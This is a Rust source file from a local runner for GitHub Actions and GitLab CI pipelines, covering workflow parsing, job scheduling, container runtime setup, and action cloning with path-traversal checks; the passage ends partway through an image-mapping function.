#[allow(unused_imports)]
use bollard::Docker;
use futures::future;
use serde_yaml::Value;
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use thiserror::Error;

use ignore::{gitignore::GitignoreBuilder, Match};

use crate::action_resolver;
use crate::dependency;
use crate::docker;
use crate::environment;
use crate::podman;
use wrkflw_logging;
use wrkflw_matrix::MatrixCombination;
use wrkflw_models::gitlab::Pipeline;
use wrkflw_parser::gitlab::{self, parse_pipeline};
use wrkflw_parser::workflow::{
    self, parse_workflow, ActionInfo, Job, JobContainer, Step, WorkflowDefinition,
};
use wrkflw_runtime::container::{ContainerRuntime, COMBINED_IMAGE_PREFIX};
use wrkflw_runtime::emulation;
use wrkflw_secrets::{SecretConfig, SecretManager, SecretMasker, SecretSubstitution};

#[allow(unused_variables, unused_assignments)]
/// Execute a GitHub Actions workflow file locally
pub async fn execute_workflow(
    workflow_path: &Path,
    config: ExecutionConfig,
) -> Result<ExecutionResult, ExecutionError> {
    wrkflw_logging::info(&format!("Executing workflow: {}", workflow_path.display()));
    wrkflw_logging::info(&format!("Runtime: {:?}", config.runtime_type));

    // Determine if this is a GitLab CI/CD pipeline or GitHub Actions workflow
    let is_gitlab = is_gitlab_pipeline(workflow_path);

    if is_gitlab {
        execute_gitlab_pipeline(workflow_path, config.clone()).await
    } else {
        execute_github_workflow(workflow_path, config.clone()).await
    }
}

/// Determine if a file is a GitLab CI/CD pipeline
fn is_gitlab_pipeline(path: &Path) -> bool {
    // Check the file name
    if let Some(file_name) = path.file_name() {
        if let Some(file_name_str) = file_name.to_str() {
            return file_name_str == ".gitlab-ci.yml" || file_name_str.ends_with("gitlab-ci.yml");
        }
    }

    // If file name check fails, try to read and determine by content
    if let Ok(content) = fs::read_to_string(path) {
        // GitLab CI/CD pipelines typically have stages, before_script, after_script at the top level
        if content.contains("stages:")
            || content.contains("before_script:")
            || content.contains("after_script:")
        {
            // Check for GitHub Actions specific keys that would indicate it's not GitLab
            if !content.contains("on:")
                && !content.contains("runs-on:")
                && !content.contains("uses:")
            {
                return true;
            }
        }
    }

    false
}

/// Execute a GitHub Actions workflow file locally
async fn execute_github_workflow(
    workflow_path: &Path,
    config: ExecutionConfig,
) -> Result<ExecutionResult, ExecutionError> {
    // 1. Parse workflow file
    let workflow = parse_workflow(workflow_path)?;

    // 2. Resolve job dependencies and create execution plan
    let execution_plan = dependency::resolve_dependencies(&workflow)?;

    // Filter to target job and its transitive dependencies if specified
    let execution_plan = if let Some(ref target_job) = config.target_job {
        dependency::filter_plan_to_job(execution_plan, target_job, &workflow.jobs, "workflow")
            .map_err(ExecutionError::Execution)?
    } else {
        execution_plan
    };

    // 3. Initialize appropriate runtime
    let runtime = initialize_runtime(
        config.runtime_type.clone(),
        config.preserve_containers_on_failure,
    )?;

    // Create a temporary workspace directory
    let workspace_dir = tempfile::tempdir()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create workspace: {}", e)))?;

    // 4. Set up GitHub-like environment
    let mut env_context = environment::create_github_context(&workflow, workspace_dir.path());

    // Add runtime mode to environment
    env_context.insert(
        "WRKFLW_RUNTIME_MODE".to_string(),
        match config.runtime_type {
            RuntimeType::Emulation => "emulation".to_string(),
            RuntimeType::SecureEmulation => "secure_emulation".to_string(),
            RuntimeType::Docker => "docker".to_string(),
            RuntimeType::Podman => "podman".to_string(),
        },
    );

    // show=true means hide=false (inverted for the env var)
    env_context.insert(
        "WRKFLW_HIDE_ACTION_MESSAGES".to_string(),
        if config.show_action_messages {
            "false"
        } else {
            "true"
        }
        .to_string(),
    );

    // Setup GitHub environment files
    environment::setup_github_environment_files(workspace_dir.path()).map_err(|e| {
        ExecutionError::Execution(format!("Failed to setup GitHub env files: {}", e))
    })?;

    // 5. Initialize secrets management
    let secret_manager = if let Some(secrets_config) = &config.secrets_config {
        Some(
            SecretManager::new(secrets_config.clone())
                .await
                .map_err(|e| {
                    ExecutionError::Execution(format!("Failed to initialize secret manager: {}", e))
                })?,
        )
    } else {
        Some(SecretManager::default().await.map_err(|e| {
            ExecutionError::Execution(format!(
                "Failed to initialize default secret manager: {}",
                e
            ))
        })?)
    };

    let secret_masker = SecretMasker::new();

    // 6. Execute jobs according to the plan
    let mut results = Vec::new();
    let mut has_failures = false;
    let mut failure_details = String::new();

    for job_batch in execution_plan {
        // Execute jobs in parallel if they don't depend on each other
        let job_results = execute_job_batch(
            &job_batch,
            &workflow,
            runtime.as_ref(),
            &env_context,
            config.verbose,
            secret_manager.as_ref(),
            Some(&secret_masker),
        )
        .await?;

        // Check for job failures and collect details
        for job_result in &job_results {
            if job_result.status == JobStatus::Failure {
                has_failures = true;
                failure_details.push_str(&format!("\n❌ Job failed: {}\n", job_result.name));

                // Add step details for failed jobs
                for step in &job_result.steps {
                    if step.status == StepStatus::Failure {
                        failure_details.push_str(&format!("  ❌ {}: {}\n", step.name, step.output));
                    }
                }
            }
        }

        results.extend(job_results);
    }

    // If there were failures, add detailed failure information to the result
    if has_failures {
        wrkflw_logging::error(&format!("Workflow execution failed:{}", failure_details));
    }

    Ok(ExecutionResult {
        jobs: results,
        failure_details: if has_failures {
            Some(failure_details)
        } else {
            None
        },
    })
}

/// Execute a GitLab CI/CD pipeline locally
async fn execute_gitlab_pipeline(
    pipeline_path: &Path,
    config: ExecutionConfig,
) -> Result<ExecutionResult, ExecutionError> {
    wrkflw_logging::info("Executing GitLab CI/CD pipeline");

    // 1. Parse the GitLab pipeline file
    let pipeline = parse_pipeline(pipeline_path)
        .map_err(|e| ExecutionError::Parse(format!("Failed to parse GitLab pipeline: {}", e)))?;

    // 2. Convert the GitLab pipeline to a format compatible with the workflow executor
    let workflow = gitlab::convert_to_workflow_format(&pipeline);

    // 3. Resolve job dependencies based on stages
    let execution_plan = resolve_gitlab_dependencies(&pipeline, &workflow)?;

    // Filter to target job and its stage-based dependencies if specified.
    // GitLab uses stages for implicit ordering, so we keep all earlier stages.
    let execution_plan = if let Some(ref target_job) = config.target_job {
        dependency::filter_plan_to_job_by_stage(
            execution_plan,
            target_job,
            &workflow.jobs,
            "pipeline",
        )
        .map_err(ExecutionError::Execution)?
    } else {
        execution_plan
    };

    // 4. Initialize appropriate runtime
    let runtime = initialize_runtime(
        config.runtime_type.clone(),
        config.preserve_containers_on_failure,
    )?;

    // Create a temporary workspace directory
    let workspace_dir = tempfile::tempdir()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create workspace: {}", e)))?;

    // 5. Set up GitLab-like environment
    let mut env_context = create_gitlab_context(&pipeline, workspace_dir.path());

    // Add runtime mode to environment
    env_context.insert(
        "WRKFLW_RUNTIME_MODE".to_string(),
        match config.runtime_type {
            RuntimeType::Emulation => "emulation".to_string(),
            RuntimeType::SecureEmulation => "secure_emulation".to_string(),
            RuntimeType::Docker => "docker".to_string(),
            RuntimeType::Podman => "podman".to_string(),
        },
    );

    // Setup environment files
    environment::setup_github_environment_files(workspace_dir.path()).map_err(|e| {
        ExecutionError::Execution(format!("Failed to setup environment files: {}", e))
    })?;

    // 6. Initialize secrets management
    let secret_manager = if let Some(secrets_config) = &config.secrets_config {
        Some(
            SecretManager::new(secrets_config.clone())
                .await
                .map_err(|e| {
                    ExecutionError::Execution(format!("Failed to initialize secret manager: {}", e))
                })?,
        )
    } else {
        Some(SecretManager::default().await.map_err(|e| {
            ExecutionError::Execution(format!(
                "Failed to initialize default secret manager: {}",
                e
            ))
        })?)
    };

    let secret_masker = SecretMasker::new();

    // 7. Execute jobs according to the plan
    let mut results = Vec::new();
    let mut has_failures = false;
    let mut failure_details = String::new();

    for job_batch in execution_plan {
        // Execute jobs in parallel if they don't depend on each other
        let job_results = execute_job_batch(
            &job_batch,
            &workflow,
            runtime.as_ref(),
            &env_context,
            config.verbose,
            secret_manager.as_ref(),
            Some(&secret_masker),
        )
        .await?;

        // Check for job failures and collect details
        for job_result in &job_results {
            if job_result.status == JobStatus::Failure {
                has_failures = true;
                failure_details.push_str(&format!("\n❌ Job failed: {}\n", job_result.name));

                // Add step details for failed jobs
                for step in &job_result.steps {
                    if step.status == StepStatus::Failure {
                        failure_details.push_str(&format!("  ❌ {}: {}\n", step.name, step.output));
                    }
                }
            }
        }

        results.extend(job_results);
    }

    // If there were failures, add detailed failure information to the result
    if has_failures {
        wrkflw_logging::error(&format!("Pipeline execution failed:{}", failure_details));
    }

    Ok(ExecutionResult {
        jobs: results,
        failure_details: if has_failures {
            Some(failure_details)
        } else {
            None
        },
    })
}

/// Create an environment context for GitLab CI/CD pipeline execution
fn create_gitlab_context(pipeline: &Pipeline, workspace_dir: &Path) -> HashMap<String, String> {
    let mut env_context = HashMap::new();

    // Add GitLab CI/CD environment variables
    env_context.insert("CI".to_string(), "true".to_string());
    env_context.insert("GITLAB_CI".to_string(), "true".to_string());

    // Add custom environment variable to indicate use in wrkflw
    env_context.insert("WRKFLW_CI".to_string(), "true".to_string());

    // Add workspace directory
    env_context.insert(
        "CI_PROJECT_DIR".to_string(),
        workspace_dir.to_string_lossy().to_string(),
    );

    // Also add the workspace as the GitHub workspace for compatibility with emulation runtime
    env_context.insert(
        "GITHUB_WORKSPACE".to_string(),
        workspace_dir.to_string_lossy().to_string(),
    );

    // Add global variables from the pipeline
    if let Some(variables) = &pipeline.variables {
        for (key, value) in variables {
            env_context.insert(key.clone(), value.clone());
        }
    }

    env_context
}

/// Resolve GitLab CI/CD pipeline dependencies
fn resolve_gitlab_dependencies(
    pipeline: &Pipeline,
    workflow: &WorkflowDefinition,
) -> Result<Vec<Vec<String>>, ExecutionError> {
    // For GitLab CI/CD pipelines, jobs within the same stage can run in parallel,
    // but jobs in different stages run sequentially

    // Get stages from the pipeline or create a default one
    let stages = match &pipeline.stages {
        Some(defined_stages) => defined_stages.clone(),
        None => vec![
            "build".to_string(),
            "test".to_string(),
            "deploy".to_string(),
        ],
    };

    // Create an execution plan based on stages
    let mut execution_plan = Vec::new();

    // For each stage, collect the jobs that belong to it
    for stage in stages {
        let mut stage_jobs = Vec::new();

        for (job_name, job) in &pipeline.jobs {
            // Skip template jobs
            if let Some(true) = job.template {
                continue;
            }

            // Get the job's stage, or assume "test" if not specified
            let default_stage = "test".to_string();
            let job_stage = job.stage.as_ref().unwrap_or(&default_stage);

            // If the job belongs to the current stage, add it to the batch
            if job_stage == &stage {
                stage_jobs.push(job_name.clone());
            }
        }

        if !stage_jobs.is_empty() {
            execution_plan.push(stage_jobs);
        }
    }

    // Also create a batch for jobs without a stage
    let mut stageless_jobs = Vec::new();

    for (job_name, job) in &pipeline.jobs {
        // Skip template jobs
        if let Some(true) = job.template {
            continue;
        }

        if job.stage.is_none() {
            stageless_jobs.push(job_name.clone());
        }
    }

    if !stageless_jobs.is_empty() {
        execution_plan.push(stageless_jobs);
    }

    Ok(execution_plan)
}

// Determine if Docker/Podman is available or fall back to emulation
fn initialize_runtime(
    runtime_type: RuntimeType,
    preserve_containers_on_failure: bool,
) -> Result<Box<dyn ContainerRuntime>, ExecutionError> {
    match runtime_type {
        RuntimeType::Docker => {
            if docker::is_available() {
                // Handle the Result returned by DockerRuntime::new()
                match docker::DockerRuntime::new_with_config(preserve_containers_on_failure) {
                    Ok(docker_runtime) => Ok(Box::new(docker_runtime)),
                    Err(e) => {
                        wrkflw_logging::error(&format!(
                            "Failed to initialize Docker runtime: {}, falling back to emulation mode",
                            e
                        ));
                        Ok(Box::new(emulation::EmulationRuntime::new()))
                    }
                }
            } else {
                wrkflw_logging::error("Docker not available, falling back to emulation mode");
                Ok(Box::new(emulation::EmulationRuntime::new()))
            }
        }
        RuntimeType::Podman => {
            if podman::is_available() {
                // Handle the Result returned by PodmanRuntime::new()
                match podman::PodmanRuntime::new_with_config(preserve_containers_on_failure) {
                    Ok(podman_runtime) => Ok(Box::new(podman_runtime)),
                    Err(e) => {
                        wrkflw_logging::error(&format!(
                            "Failed to initialize Podman runtime: {}, falling back to emulation mode",
                            e
                        ));
                        Ok(Box::new(emulation::EmulationRuntime::new()))
                    }
                }
            } else {
                wrkflw_logging::error("Podman not available, falling back to emulation mode");
                Ok(Box::new(emulation::EmulationRuntime::new()))
            }
        }
        RuntimeType::Emulation => Ok(Box::new(emulation::EmulationRuntime::new())),
        RuntimeType::SecureEmulation => Ok(Box::new(
            wrkflw_runtime::secure_emulation::SecureEmulationRuntime::new(),
        )),
    }
}

#[derive(Debug, Clone, PartialEq)]
pub enum RuntimeType {
    Docker,
    Podman,
    Emulation,
    SecureEmulation,
}

#[derive(Debug, Clone)]
pub struct ExecutionConfig {
    pub runtime_type: RuntimeType,
    pub verbose: bool,
    pub preserve_containers_on_failure: bool,
    pub secrets_config: Option<SecretConfig>,
    pub show_action_messages: bool,
    pub target_job: Option<String>,
}

pub struct ExecutionResult {
    pub jobs: Vec<JobResult>,
    pub failure_details: Option<String>,
}

pub struct JobResult {
    pub name: String,
    pub status: JobStatus,
    pub steps: Vec<StepResult>,
    pub logs: String,
}

#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)]
pub enum JobStatus {
    Success,
    Failure,
    Skipped,
}

#[derive(Debug, Clone)]
pub struct StepResult {
    pub name: String,
    pub status: StepStatus,
    pub output: String,
}

#[derive(Debug, Clone, PartialEq)]
#[allow(dead_code)]
pub enum StepStatus {
    Success,
    Failure,
    Skipped,
}

#[derive(Error, Debug)]
pub enum ExecutionError {
    #[error("Parse error: {0}")]
    Parse(String),

    #[error("Runtime error: {0}")]
    Runtime(String),

    #[error("Execution error: {0}")]
    Execution(String),

    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
}

// Convert errors from other modules
impl From<String> for ExecutionError {
    fn from(err: String) -> Self {
        ExecutionError::Parse(err)
    }
}

/// The result of preparing an action — either a Docker image to run or a composite action.
enum PreparedAction {
    /// Docker action: run with the image's native entrypoint/CMD, optionally
    /// overridden by `runs.entrypoint` and `runs.args` from action.yml.
    /// Used for DockerBuild and Docker registry actions.
    NativeDocker {
        image: String,
        entrypoint: Option<String>,
        args: Vec<String>,
    },
    /// A Docker image name to run a shell command in.
    ///
    /// Used by Node.js actions (resolved to `node:XX-slim`), the
    /// `determine_action_image` fallback, and `run:` steps. These paths
    /// build an explicit shell command that is passed as CMD, so the
    /// image's built-in ENTRYPOINT is intentionally overridden with a
    /// bash wrapper. If you need the image's native ENTRYPOINT/CMD,
    /// use `NativeDocker` instead.
    Image(String),
    /// A composite action that needs special step-based execution.
    Composite,
}

// Add Action preparation functions
async fn prepare_action(
    action: &ActionInfo,
    runtime: &dyn ContainerRuntime,
) -> Result<PreparedAction, ExecutionError> {
    if action.is_docker {
        // Docker action: pull the image and run with its native entrypoint
        let image = action.repository.trim_start_matches("docker://");

        runtime
            .pull_image(image)
            .await
            .map_err(|e| ExecutionError::Runtime(format!("Failed to pull Docker image: {}", e)))?;

        return Ok(PreparedAction::NativeDocker {
            image: image.to_string(),
            entrypoint: None,
            args: vec![],
        });
    }

    if action.is_local {
        // Local action: build from local directory
        let action_dir = Path::new(&action.repository);

        if !action_dir.exists() {
            return Err(ExecutionError::Execution(format!(
                "Local action directory not found: {}",
                action_dir.display()
            )));
        }

        let dockerfile = action_dir.join("Dockerfile");
        if dockerfile.exists() {
            // It's a Docker action, build it
            let tag = format!("wrkflw-local-action:{}", uuid::Uuid::new_v4());

            runtime
                .build_image(&dockerfile, &tag, action_dir)
                .await
                .map_err(|e| ExecutionError::Runtime(format!("Failed to build image: {}", e)))?;

            // Parse action.yml if present for entrypoint/args
            let definition: Option<serde_yaml::Value> =
                std::fs::read_to_string(action_dir.join("action.yml"))
                    .or_else(|_| std::fs::read_to_string(action_dir.join("action.yaml")))
                    .ok()
                    .and_then(|s| serde_yaml::from_str(&s).ok());
            let (entrypoint, args) =
                extract_docker_runs_config(definition.as_ref()).map_err(|e| {
                    ExecutionError::Execution(format!(
                        "Invalid runs config in local action '{}': {}",
                        action.repository, e
                    ))
                })?;

            return Ok(PreparedAction::NativeDocker {
                image: tag,
                entrypoint,
                args,
            });
        } else {
            // It's a JavaScript or composite action
            // For simplicity, we'll use node to run it (this would need more work for full support)
            return Ok(PreparedAction::Image("node:20-slim".to_string()));
        }
    }

    // GitHub action: try to fetch action.yml from the remote repository
    if !action.repository.is_empty() && !action.version.is_empty() {
        match action_resolver::resolve_remote_action(
            &action.repository,
            &action.version,
            action.sub_path.as_deref(),
        )
        .await
        {
            Ok(resolved) => match &resolved.action_type {
                action_resolver::ActionType::Node { version } => {
                    let image = format!("node:{}-slim", version);
                    wrkflw_logging::info(&format!(
                        "Resolved action '{}' -> image '{}'",
                        action.repository, image
                    ));
                    return Ok(PreparedAction::Image(image));
                }
                action_resolver::ActionType::Docker { image } => {
                    wrkflw_logging::info(&format!(
                        "Resolved action '{}' -> Docker image '{}'",
                        action.repository, image
                    ));
                    let (entrypoint, args) =
                        extract_docker_runs_config(resolved.definition.as_ref()).map_err(|e| {
                            ExecutionError::Execution(format!(
                                "Invalid runs config for action '{}': {}",
                                action.repository, e
                            ))
                        })?;
                    return Ok(PreparedAction::NativeDocker {
                        image: image.clone(),
                        entrypoint,
                        args,
                    });
                }
                action_resolver::ActionType::Composite => {
                    wrkflw_logging::info(&format!(
                        "Resolved action '{}' as composite action",
                        action.repository
                    ));
                    return Ok(PreparedAction::Composite);
                }
                action_resolver::ActionType::DockerBuild => {
                    wrkflw_logging::info(&format!(
                        "Resolved action '{}' as DockerBuild — cloning and building",
                        action.repository
                    ));

                    // Clone the repository.
                    // `tempdir` is only needed through `build_image` — after the
                    // image is built all files are baked into the Docker image
                    // and the temp directory can be dropped safely.
                    let tempdir = tempfile::tempdir().map_err(|e| {
                        ExecutionError::Execution(format!("Failed to create temp dir: {}", e))
                    })?;
                    let repo_url = format!("https://github.com/{}.git", action.repository);
                    let repo_dir = tempdir.path().join("action");
                    shallow_clone(&repo_url, &action.version, &repo_dir).await?;

                    // Resolve the action directory (respecting sub_path)
                    let action_dir = match &action.sub_path {
                        Some(p) => {
                            sanitize_sub_path(p).map_err(|e| {
                                ExecutionError::Execution(format!(
                                    "Invalid sub_path for action '{}': {}",
                                    action.repository, e
                                ))
                            })?;
                            repo_dir.join(p)
                        }
                        None => repo_dir.clone(),
                    };

                    // Defense-in-depth: verify the action directory is still
                    // inside the cloned repo after symlink resolution.
                    let canon_action_dir = action_dir.canonicalize().map_err(|e| {
                        ExecutionError::Execution(format!(
                            "Failed to canonicalize action directory: {}",
                            e
                        ))
                    })?;
                    let canon_repo_dir = repo_dir.canonicalize().map_err(|e| {
                        ExecutionError::Execution(format!(
                            "Failed to canonicalize repo directory: {}",
                            e
                        ))
                    })?;
                    if !canon_action_dir.starts_with(&canon_repo_dir) {
                        return Err(ExecutionError::Execution(format!(
                            "Action sub_path escapes repository directory for action '{}'",
                            action.repository
                        )));
                    }

                    // Get the Dockerfile path from action.yml's runs.image field.
                    let dockerfile_raw = resolved
                        .definition
                        .as_ref()
                        .and_then(|d| d.get("runs"))
                        .and_then(|r| r.get("image"))
                        .and_then(|i| i.as_str())
                        .unwrap_or("Dockerfile");

                    let dockerfile_rel = sanitize_dockerfile_rel(dockerfile_raw).map_err(|e| {
                        ExecutionError::Execution(format!(
                            "Invalid Dockerfile path for action '{}': {}",
                            action.repository, e
                        ))
                    })?;

                    let dockerfile = action_dir.join(dockerfile_rel);

                    if !dockerfile.exists() {
                        return Err(ExecutionError::Execution(format!(
                            "Dockerfile not found at {} for action '{}'",
                            dockerfile.display(),
                            action.repository
                        )));
                    }

                    // Defense-in-depth: verify the resolved Dockerfile is
                    // still inside the action directory after symlink resolution.
                    // (canon_action_dir was already computed above for the sub_path check.)
                    let canon_dockerfile = dockerfile.canonicalize().map_err(|e| {
                        ExecutionError::Execution(format!(
                            "Failed to canonicalize Dockerfile path: {}",
                            e
                        ))
                    })?;
                    if !canon_dockerfile.starts_with(&canon_action_dir) {
                        return Err(ExecutionError::Execution(format!(
                            "Dockerfile path '{}' escapes action directory for action '{}'",
                            dockerfile.display(),
                            action.repository
                        )));
                    }

                    // Build the image
                    let tag = format!("wrkflw-action:{}", uuid::Uuid::new_v4());
                    runtime
                        .build_image(&dockerfile, &tag, &action_dir)
                        .await
                        .map_err(|e| {
                            ExecutionError::Runtime(format!(
                                "Failed to build Dockerfile for action '{}': {}",
                                action.repository, e
                            ))
                        })?;

                    let (entrypoint, args) =
                        extract_docker_runs_config(resolved.definition.as_ref()).map_err(|e| {
                            ExecutionError::Execution(format!(
                                "Invalid runs config for action '{}': {}",
                                action.repository, e
                            ))
                        })?;
                    return Ok(PreparedAction::NativeDocker {
                        image: tag,
                        entrypoint,
                        args,
                    });
                }
            },
            Err(e) => {
                wrkflw_logging::warning(&format!(
                    "Could not fetch action.yml for {}@{}: {}. Falling back to built-in mapping.",
                    action.repository, action.version, e
                ));
            }
        }
    }

    // Fallback: determine appropriate image based on hardcoded action type mapping
    let image = determine_action_image(&action.repository);
    Ok(PreparedAction::Image(image))
}

/// Execute a `NativeDocker` action step.
///
/// Handles `with.args` / `with.entrypoint` overrides, INPUT_* env injection,
/// volume setup, and container invocation.
async fn execute_native_docker_step(
    ctx: &StepExecutionContext<'_>,
    step_env: &mut HashMap<String, String>,
    step_name: String,
    uses: &str,
    image: String,
    entrypoint: Option<String>,
    args: Vec<String>,
) -> Result<StepResult, ExecutionError> {
    // Convert 'with' parameters to INPUT_* environment variables.
    // Also extract 'with.args' — if provided by the workflow step, it
    // overrides the action.yml's runs.args as the container CMD
    // (this matches GitHub Actions behavior).
    let mut with_args_override: Option<String> = None;
    // Allow workflow step to override entrypoint via `with.entrypoint`,
    // matching GitHub Actions behavior.
    let mut entrypoint = entrypoint;
    if let Some(with_params) = &ctx.step.with {
        for (key, value) in with_params {
            step_env.insert(format!("INPUT_{}", key.to_uppercase()), value.clone());
        }
        // Presence of the key is the override signal — even an empty
        // string means "pass zero args", matching GitHub Actions behavior.
        if let Some(a) = with_params.get("args") {
            with_args_override = Some(a.clone());
        }
        if let Some(ep) = with_params.get("entrypoint") {
            entrypoint = Some(ep.clone());
        }
    }

    let container_workspace = Path::new("/github/workspace");
    let mount_ctx = prepare_step_container_context(step_env, ctx.job_env, ctx.container_config);
    let volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
    let env_vars: Vec<(&str, &str)> = step_env
        .iter()
        .map(|(k, v)| (k.as_str(), v.as_str()))
        .collect();

    wrkflw_logging::info(&format!(
        "Running Docker action '{}' with image '{}'",
        uses, image
    ));

    // Determine container CMD: workflow `with.args` overrides action.yml `runs.args`.
    // If neither is specified, the image's built-in CMD takes effect.
    let effective_args: Vec<String> = if let Some(ref wa) = with_args_override {
        shlex::split(wa).ok_or_else(|| {
            ExecutionError::Execution(format!(
                "Failed to parse 'with.args' for action '{}': \
                 unmatched quote in {:?}",
                uses, wa
            ))
        })?
    } else {
        args
    };
    let args_refs: Vec<&str> = effective_args.iter().map(|s| s.as_str()).collect();

    let output = ctx
        .runtime
        .run_container(
            &image,
            &args_refs,
            &env_vars,
            container_workspace,
            &volumes,
            entrypoint.as_deref(),
        )
        .await
        .map_err(|e| ExecutionError::Runtime(format!("{}", e)))?;

    Ok(StepResult {
        name: step_name,
        status: if output.exit_code == 0 {
            StepStatus::Success
        } else {
            StepStatus::Failure
        },
        output: format!(
            "Exit code: {}\n{}\n{}",
            output.exit_code, output.stdout, output.stderr
        ),
    })
}

/// Sanitize a sub-path component from an action reference (e.g. `owner/repo/sub/path`).
///
/// Rejects any path component that is exactly `..` to prevent directory
/// traversal out of the cloned repository. Both `/` and `\` are treated
/// as separators for defense-in-depth (backslash paths are unlikely in
/// practice but could bypass a `/`-only check on Windows hosts).
fn sanitize_sub_path(raw: &str) -> Result<(), String> {
    if raw.contains('\0') {
        return Err("null byte not allowed in sub_path".to_string());
    }
    // Split on both forward and back slashes to catch Windows-style traversal.
    if raw.split(&['/', '\\'][..]).any(|c| c == "..") {
        return Err(format!("path traversal not allowed in sub_path: {}", raw));
    }
    Ok(())
}

/// Sanitize a Dockerfile path from an action.yml `runs.image` field.
///
/// Strips the `docker://` prefix and leading slashes, then rejects any
/// path component that is exactly `..` to prevent directory traversal.
fn sanitize_dockerfile_rel(raw: &str) -> Result<String, String> {
    if raw.contains('\0') {
        return Err("null byte not allowed in Dockerfile path".to_string());
    }
    let trimmed = raw
        .trim_start_matches("docker://")
        .trim_start_matches('/')
        .trim_start_matches("./");
    if trimmed.is_empty() {
        return Err("empty Dockerfile path".to_string());
    }
    if trimmed.split(&['/', '\\'][..]).any(|c| c == "..") {
        return Err(format!("path traversal not allowed: {}", trimmed));
    }
    Ok(trimmed.to_string())
}

/// Extract `runs.entrypoint` and `runs.args` from a parsed action.yml definition.
///
/// These fields allow Docker actions to override the image's default ENTRYPOINT
/// and provide arguments that are passed as CMD.
///
/// Returns an error if `runs.args` is a string with unmatched quotes, keeping
/// error handling consistent with how `with.args` is parsed at execution time.
fn extract_docker_runs_config(
    definition: Option<&serde_yaml::Value>,
) -> Result<(Option<String>, Vec<String>), String> {
    let runs = definition.and_then(|d| d.get("runs"));

    let entrypoint = runs
        .and_then(|r| r.get("entrypoint"))
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string());

    let args = match runs.and_then(|r| r.get("args")) {
        Some(v) => {
            if let Some(seq) = v.as_sequence() {
                // args as a YAML sequence: ["--flag", "value"]
                seq.iter()
                    .map(|v| {
                        v.as_str().map(|s| s.to_string()).unwrap_or_else(|| {
                            // Coerce non-string values (int, bool, etc.) to strings,
                            // matching GitHub Actions behavior.
                            serde_yaml::to_string(v)
                                .unwrap_or_default()
                                .trim()
                                .to_string()
                        })
                    })
                    .collect()
            } else if let Some(s) = v.as_str() {
                // args as a single string: "hello world" → shell-tokenize
                shlex::split(s).ok_or_else(|| format!("unmatched quote in runs.args: {:?}", s))?
            } else {
                vec![]
            }
        }
        None => vec![],
    };

    Ok((entrypoint, args))
}

/// Shallow-clone a GitHub repository at a specific ref (branch, tag, or SHA).
///
/// For branch/tag refs, uses `git clone --depth 1 --branch <ref>`.
/// For SHA refs (40 hex chars), uses `git init` + `git fetch --depth 1` + `git checkout`.
///
/// Uses `tokio::process::Command` to avoid blocking the async runtime.
async fn shallow_clone(
    repo_url: &str,
    git_ref: &str,
    target_dir: &Path,
) -> Result<(), ExecutionError> {
    let is_sha = is_git_sha(git_ref);

    // Disable git hooks for all operations — cloned repos are untrusted and
    // could contain malicious post-checkout / post-merge hooks.
    let no_hooks = ["-c", "core.hooksPath=/dev/null"];

    if is_sha {
        // SHA refs can't use --branch; use init + fetch + checkout instead
        let init = tokio::process::Command::new("git")
            .args(no_hooks)
            .arg("init")
            .arg(target_dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await
            .map_err(|e| ExecutionError::Execution(format!("Failed to execute git init: {}", e)))?;
        if !init.success() {
            return Err(ExecutionError::Execution(format!(
                "git init failed for {}",
                target_dir.display()
            )));
        }

        let fetch = tokio::process::Command::new("git")
            .args(no_hooks)
            .arg("-C")
            .arg(target_dir)
            .arg("fetch")
            .arg("--depth")
            .arg("1")
            .arg("--")
            .arg(repo_url)
            .arg(git_ref)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped())
            .output()
            .await
            .map_err(|e| {
                ExecutionError::Execution(format!("Failed to execute git fetch: {}", e))
            })?;
        if !fetch.status.success() {
            let stderr = String::from_utf8_lossy(&fetch.stderr);
            return Err(ExecutionError::Execution(format!(
                "Failed to fetch {}@{}: {}",
                repo_url,
                git_ref,
                stderr.trim()
            )));
        }

        let checkout = tokio::process::Command::new("git")
            .args(no_hooks)
            .arg("-C")
            .arg(target_dir)
            .arg("checkout")
            .arg("FETCH_HEAD")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped())
            .output()
            .await
            .map_err(|e| {
                ExecutionError::Execution(format!("Failed to execute git checkout: {}", e))
            })?;
        if !checkout.status.success() {
            let stderr = String::from_utf8_lossy(&checkout.stderr);
            return Err(ExecutionError::Execution(format!(
                "Failed to checkout FETCH_HEAD for {}@{}: {}",
                repo_url,
                git_ref,
                stderr.trim()
            )));
        }
    } else {
        // Branch/tag refs: standard shallow clone
        let output = tokio::process::Command::new("git")
            .args(no_hooks)
            .arg("clone")
            .arg("--depth")
            .arg("1")
            .arg("--single-branch")
            .arg("--branch")
            .arg(git_ref)
            .arg("--")
            .arg(repo_url)
            .arg(target_dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped())
            .output()
            .await
            .map_err(|e| ExecutionError::Execution(format!("Failed to execute git: {}", e)))?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(ExecutionError::Execution(format!(
                "Failed to clone {}@{}: {}",
                repo_url,
                git_ref,
                stderr.trim()
            )));
        }
    }

    Ok(())
}

/// Returns `true` if `git_ref` looks like a full SHA-1 hex hash (40 hex chars).
///
/// NOTE: This only detects SHA-1 (40 hex chars). Git's SHA-256 transition uses
/// 64-char hashes — update this check if/when GitHub adopts SHA-256 refs.
fn is_git_sha(git_ref: &str) -> bool {
    git_ref.len() == 40 && git_ref.chars().all(|c| c.is_ascii_hexdigit())
}

/// Determine the appropriate Docker image for a GitHub action.
///
/// Setup actions (from the `SETUP_ACTIONS` table) use the act runner base image
/// so that runtimes installed by the combined image build remain available.
/// Other well-known actions use exact-match or namespace-prefix matching.
fn determine_action_image(repository: &str) -> String {
    // Known setup actions run on the base runner image; their runtimes are
    // installed via resolve_runner_image's combined image build.
    if SETUP_ACTIONS.iter().any(|d| d.repos.contains(&repository)) {
        return "catthehacker/ubuntu:act-latest".to_string();
    }

    match repository {
        // Docker/container actions (namespace prefix)
